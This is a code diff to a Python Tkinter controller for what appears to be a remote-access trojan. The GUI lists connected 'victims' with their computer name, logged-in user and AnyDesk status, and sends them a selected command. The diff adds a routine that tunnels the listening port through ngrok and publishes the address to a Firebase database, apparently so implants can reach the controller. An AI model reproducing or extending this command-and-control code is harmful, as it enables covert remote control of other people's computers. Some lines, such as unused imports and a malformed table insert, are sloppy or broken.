@@ -1,6 +1,12 @@
+from cgitb import text
+from distutils import command
+from re import S
+import subprocess
+import os
 import socket
 import threading
 import tkinter as tk
+import requests
 from tkinter import ttk
 from tkinter.messagebox import showerror, showinfo
 
@@ -26,6 +32,7 @@ class HostWithGUI:
         param 5 type: list
         """
 
+        self.selectedVictim = None
         self.IP = IP
         self.PORT = PORT
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -53,87 +60,88 @@ class HostWithGUI:
 
         opertaionList.pack()
 
-        # Victims list
-        self.victimsListBox = tk.Listbox(self.window, selectmode="single",
-                                         yscrollcommand=yscrollbar.set)
-        # Widget expands horizontally and
-        # vertically by assigning both to
-        # fill option
-        self.victimsListBox.pack(padx=10, pady=10,
-                                 expand=tk.YES, fill="both")
+        self.victimsTable = ttk.Treeview(self.window, columns=(
+            "address", "computer_name", "logged_user_name", "is_anydesk_installed"), yscrollcommand=yscrollbar.set)
+
+        self.victimsTable.heading(
+            "address", text="Address")
+        self.victimsTable.heading(
+            "computer_name", text="Computer Name")
+        self.victimsTable.heading("logged_user_name",
+                                  text="Logged User Name")
+        self.victimsTable.heading("is_anydesk_installed",
+                                  text="Is AnyDesk Installed?")
+        self.victimsTable.pack(padx=10, pady=10,
+                               expand=tk.YES, fill="both")
+        self.victimsTable.bind('<<TreeviewSelect>>',
+                               self.victims_table_item_selected)
+        # Attach Treeview to vertical scrollbar
+        yscrollbar.config(command=self.victimsTable.yview)
+
         x = list(self.victimsList)
-
         for each_item in range(len(x)):
-            self.victimsListBox.insert(tk.END, x[each_item].getAddr())
-            self.victimsListBox.itemconfig(each_item, bg="lime")
-
-        # Attach listbox to vertical scrollbar
-        yscrollbar.config(command=self.victimsListBox.yview)
+            self.victimsTable.insert('', tk.END, (x[each_item].getAddr(
+            ), x[each_item].computerName, x[each_item].loggedUserName, x[each_item].isAnyDeskInstalled))
 
         # Start Button
         startBtn = tk.Button(
             text="Start!",
-            command=lambda:  threading.Thread(target=self.startButtonOnClick, args=(
-                variable.get(), self.victimsListBox.get(tk.ACTIVE))).start()
-
+            # command=lambda:  threading.Thread(target=self.startButtonOnClick, args=(
+            #     self, variable.get())).start()
+            command=lambda: self.startButtonOnClick(variable.get())
         )
         startBtn.pack()
 
-        infoTable = ttk.Treeview(self.window)
-        infoTable['columns'] = (
-            'computer_name', 'logged_user_name', 'is_anydesk_installed')
+        threading.Thread(target=self.initializeServer).start()
 
-        infoTable.column("#0", width=0,  stretch=tk.NO)
-        infoTable.column("computer_name", anchor=tk.CENTER, width=80)
-        infoTable.column("logged_user_name", anchor=tk.CENTER, width=80)
-        infoTable.column("is_anydesk_installed", anchor=tk.CENTER, width=80)
+    def victims_table_item_selected(self, event):
+        """
+        Called when item in the victims table is clicked
 
-        infoTable.heading("#0", text="", anchor=tk.CENTER)
-        infoTable.heading(
-            "computer_name", text="Computer Name", anchor=tk.CENTER)
-        infoTable.heading("logged_user_name",
-                          text="Logged User Name", anchor=tk.CENTER)
-        infoTable.heading("is_anydesk_installed",
-                          text="Is AnyDesk Installed?", anchor=tk.CENTER)
+        So we will update our self.selectedVictim
+        """
+        for selected_item in self.victimsTable.selection():
 
-        infoTable.pack()
+            item = self.victimsTable.item(selected_item)
+            values = item['values']
+            address = values[0]
+            computerName = values[1]
+            loggedUsername = values[2]
+            isAnyDeskInstalled = values[3]
 
-    def startButtonOnClick(self, selectedOption, selectedVictimAddr):
+            for i in self.victimsList:
+                if f"{i.getAddr()[0]} {i.getAddr()[1]}" == address:
+                    self.selectedVictim = i
+
+    def startButtonOnClick(self, selectedOption):
         """
         Called when the start button is clicked
 
         param 1: the selected option (command to execute)
-        param 2: the socket address (IP, PORT) of the victim which the command has to be executed on
 
         param 1 type: str
-        param 2 type: socket.socket
         """
 
-        # Gets the selected victim object from the victims list
-        selectedVictim = None
-        for i in self.victimsList:
-            if i.getAddr() == selectedVictimAddr:
-                selectedVictim = i
-                break
-
-        if selectedVictim == None:
+        if self.selectedVictim == None:
             self.showError("Error", "Please choose a victim!")
         else:
             try:
-                self.startButtonCallAble(selectedOption, selectedVictim)
+                threading.Thread(target=self.startButtonCallAble,
+                                 args=(selectedOption, self.selectedVictim)).start()
             except socket.error:
-                self.removeVictim(selectedVictim)
+                self.removeVictim(self.selectedVictim)
                 self.showError(
-                    "Error", f"The victim {selectedVictim} has been disconnected!")
+                    "Error", f"The victim {self.selectedVictim.getAddr()} has been disconnected!")
 
             except ThereIsAlreadyOneRunningCommand:
                 self.showError(
                     "Error", "Can't perform another command while 1 is running! wait for the running one to finish!")
 
-    def startServer(self):
+    def initializeServer(self):
         """
-        Starts the server
+        Initializes the server
         """
+        self._initializeNgrok()
 
         self.socket.bind((self.IP, self.PORT))
         self.socket.listen()
@@ -144,6 +152,50 @@ class HostWithGUI:
 
             victim = Victim(clientSoc)
             self.addVictim(victim)
+
+    def _initializeNgrok(self):
+        """
+        Initialize ngrok
+        """
+
+        # Contains the path to the ngrok exe file
+        ngrok_file_path = os.path.join(os.path.dirname(
+            os.path.dirname(__file__)), "ngrok.exe")
+
+        # Will contains the address of the ngrok server
+        ngrok_url = None
+
+        # Kills ngrok if running
+        process = subprocess.run("taskkill /f /im ngrok.exe")
+        # Gets the address of the ngrok server
+        process = subprocess.Popen(
+            f'{ngrok_file_path} tcp {self.PORT} --log "stdout"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        while True:
+            output = process.stdout.readline()
+            if not output and process.poll() is not None:
+                break
+            elif b'url=' in output:
+                output = output.decode()
+                output = output[output.index('url=tcp://') + 10: -1]
+                ngrok_url = output.split(':')
+                break
+
+        ngrok_ip = socket.gethostbyname(ngrok_url[0])
+        ngrok_port = ngrok_url[1]
+
+        # Updates the ip&port on the server
+        request = requests.patch("https://sc-initiation-5d638-default-rtdb.firebaseio.com/.json",
+                                 json={
+                                     "ip": ngrok_ip,
+                                     "port": ngrok_port,
+                                 })
+
+        if(request.status_code != 200):
+            raise Exception("Can't update ip!")
+
+        print(
+            "Ngrok has been sucessfully launched! and the ip has been sucessfully updated!")
+        print(f"IP:{ngrok_ip} PORT:{ngrok_port}")
 
     def addVictim(self, victim):
         """
@@ -156,7 +208,9 @@ class HostWithGUI:
         # Adds the new victim to the victims list
         self.victimsList.append(victim)
         # Add the new victim to the victims listbox
-        self.victimsListBox.insert(tk.END, victim.getAddr())
+        # self.victimsListBox.insert(tk.END, victim.getAddr())
+        self.victimsTable.insert('', tk.END, values=(victim.getAddr(
+        ), victim.computerName, victim.loggedUserName, victim.isAnyDeskInstalled))
 
     def removeVictim(self, victim):
         """
@@ -169,8 +223,10 @@ class HostWithGUI:
         # Removes the victim from the victims list
         self.victimsList.remove(victim)
         # Removes the victim from the victims listbox
-        idx = self.victimsListBox.get(0, tk.END).index(victim.getAddr())
-        self.victimsListBox.delete(idx)
+        # idx = self.victimsListBox.get(0, tk.END).index(victim.getAddr())
+        # self.victimsListBox.delete(idx)
+        self.victimsTable.delete((victim.getAddr(
+        ), victim.computerName, victim.loggedUserName, victim.isAnyDeskInstalled))
 
     def buildGUI(self):
         """
